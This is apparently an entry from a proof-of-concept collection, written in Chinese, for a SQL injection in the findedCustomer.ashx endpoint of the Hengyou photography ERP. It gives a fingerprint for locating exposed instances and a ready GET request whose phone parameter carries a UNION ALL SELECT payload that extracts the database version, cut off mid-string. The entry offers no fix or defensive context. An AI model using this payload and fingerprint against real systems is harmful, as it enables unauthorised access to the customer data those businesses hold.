# 恒友摄影ERPfindedCustomer.ashx存在SQL注入漏洞

- **系统**：恒友摄影　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`body="BookChooseDateOrder.html"`
- **请求**：`GET /ashx/findedCustomer.ashx?Method=InitPage&UserID=20130107155124520&ShopID=F0&name=1&phone=')+UNION+ALL+SELECT+NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,@@version,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,N`
- **关键头**：`Priority: u=0, i`
- **预期**：200　|　—